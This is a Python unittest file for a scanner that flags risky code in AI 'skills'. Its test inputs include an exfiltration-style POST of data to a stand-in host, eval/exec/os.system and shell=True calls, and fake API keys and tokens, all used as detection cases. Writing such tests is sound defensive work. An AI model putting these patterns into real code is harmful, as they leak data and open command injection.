"""Tests for the skill supply-chain scanner."""
from __future__ import annotations

import unittest

import support  # noqa: F401

from skill_scanner import (
    SKILL_SCANNER_VERSION,
    Issue,
    RiskLevel,
    SkillReport,
    classify_report,
    scan_skill,
)


class CleanCodeTests(unittest.TestCase):
    def test_clean_code_is_low_and_issueless(self):
        code = 'import os\napi_key = os.environ["SKILL_KEY"]\nprint("hello")\n'
        report = scan_skill(code, "clean")
        self.assertEqual(report.risk_level, RiskLevel.LOW)
        self.assertEqual(report.issue_count, 0)
        self.assertFalse(report.has_critical)
        self.assertEqual(classify_report(report), "clean")

    def test_empty_code_is_clean(self):
        report = scan_skill("", "empty")
        self.assertEqual(report.risk_level, RiskLevel.LOW)
        self.assertEqual(classify_report(report), "clean")

    def test_env_var_read_is_not_flagged(self):
        for snippet in (
            'api_key = os.environ["X"]\n',
            "api_key = os.getenv('X')\n",
            "password = getpass.getpass()\n",
        ):
            with self.subTest(snippet=snippet):
                report = scan_skill(snippet, "env")
                self.assertEqual(
                    [i for i in report.issues if i.rule_id == "hardcoded-credential"],
                    [],
                )


class HardcodedCredentialTests(unittest.TestCase):
    def test_generic_password_literal_is_high(self):
        report = scan_skill('password = "s3cr3t-hunter2"\n', "s")
        creds = [i for i in report.issues if i.rule_id == "hardcoded-credential"]
        self.assertTrue(creds)
        self.assertTrue(all(i.severity is RiskLevel.HIGH for i in creds))
        self.assertEqual(classify_report(report), "suspicious")

    def test_aws_key_format_is_critical(self):
        report = scan_skill('key = "AKIAIOSFODNN7EXAMPLE"\n', "s")
        creds = [i for i in report.issues if i.rule_id == "hardcoded-credential"]
        self.assertTrue(any(i.severity is RiskLevel.CRITICAL for i in creds))
        self.assertTrue(report.has_critical)
        self.assertEqual(classify_report(report), "malicious")

    def test_openai_key_format_is_critical(self):
        report = scan_skill('k = "sk-abcdefghijklmnopqrstuvwx"\n', "s")
        self.assertEqual(classify_report(report), "malicious")

    def test_github_token_format_is_critical(self):
        report = scan_skill('t = "ghp_abcdefghijklmnopqrst"\n', "s")
        self.assertEqual(classify_report(report), "malicious")


class NetworkTests(unittest.TestCase):
    def test_post_with_payload_is_critical_exfiltration(self):
        code = 'import requests\nrequests.post("https://x.example/", json={"k": v})\n'
        report = scan_skill(code, "s")
        exfil = [i for i in report.issues if i.rule_id == "network-exfiltration"]
        self.assertTrue(any(i.severity is RiskLevel.CRITICAL for i in exfil))
        self.assertEqual(classify_report(report), "malicious")

    def test_plain_get_is_high_not_critical(self):
        code = 'import requests\nrequests.get("https://api.example/status")\n'
        report = scan_skill(code, "s")
        net = [i for i in report.issues if i.rule_id == "network-exfiltration"]
        self.assertTrue(net)
        self.assertTrue(all(i.severity is RiskLevel.HIGH for i in net))
        self.assertEqual(classify_report(report), "suspicious")

    def test_urlopen_is_flagged(self):
        code = 'import urllib.request\nurllib.request.urlopen("https://x.example")\n'
        report = scan_skill(code, "s")
        self.assertTrue([i for i in report.issues if i.rule_id == "network-exfiltration"])


class DynamicExecTests(unittest.TestCase):
    def test_eval_is_critical(self):
        report = scan_skill("eval(user_input)\n", "s")
        self.assertTrue(
            any(i.rule_id == "dynamic-exec" and i.severity is RiskLevel.CRITICAL
                for i in report.issues)
        )
        self.assertEqual(classify_report(report), "malicious")

    def test_exec_and_os_system_are_critical(self):
        for snippet in ("exec(code)\n", "import os\nos.system(cmd)\n"):
            with self.subTest(snippet=snippet):
                report = scan_skill(snippet, "s")
                self.assertEqual(classify_report(report), "malicious")

    def test_shell_true_is_critical(self):
        code = 'import subprocess\nsubprocess.run(cmd, shell=True)\n'
        report = scan_skill(code, "s")
        self.assertEqual(classify_report(report), "malicious")


class ObfuscationTests(unittest.TestCase):
    def test_long_base64_blob_is_high(self):
        blob = "A" * 220
        report = scan_skill(f'payload = "{blob}"\n', "s")
        obf = [i for i in report.issues if i.rule_id == "obfuscated-code"]
        self.assertTrue(any(i.severity is RiskLevel.HIGH for i in obf))

    def test_decode_primitive_alone_is_medium(self):
        code = 'import base64\nbase64.b64decode(data)\n'
        report = scan_skill(code, "s")
        obf = [i for i in report.issues if i.rule_id == "obfuscated-code"]
        self.assertTrue(obf)
        self.assertTrue(all(i.severity is RiskLevel.MEDIUM for i in obf))
        self.assertEqual(classify_report(report), "clean")


class ReportSemanticsTests(unittest.TestCase):
    def test_line_numbers_are_1_based(self):
        code = 'x = 1\neval(y)\n'
        report = scan_skill(code, "s")
        dyn = [i for i in report.issues if i.rule_id == "dynamic-exec"]
        self.assertEqual(len(dyn), 1)
        self.assertEqual(dyn[0].line, 2)

    def test_worst_severity_wins(self):
        code = 'password = "abc123"\neval(x)\n'
        report = scan_skill(code, "s")
        self.assertEqual(report.risk_level, RiskLevel.CRITICAL)

    def test_report_is_frozen(self):
        report = scan_skill("", "s")
        with self.assertRaises(Exception):
            report.risk_level = RiskLevel.HIGH  # type: ignore[misc]

    def test_summary_mentions_version(self):
        report = scan_skill("", "s")
        self.assertIn(SKILL_SCANNER_VERSION, report.summary())
        self.assertIn("s", report.summary())

    def test_non_string_code_raises_type_error(self):
        with self.assertRaises(TypeError):
            scan_skill(None)  # type: ignore[arg-type]

    def test_empty_skill_name_raises(self):
        with self.assertRaises(ValueError):
            scan_skill("x = 1", "")

    def test_issue_is_frozen(self):
        issue = Issue(rule_id="r", severity=RiskLevel.LOW, line=1, detail="d")
        with self.assertRaises(Exception):
            issue.detail = "x"  # type: ignore[misc]


if __name__ == "__main__":
    unittest.main()
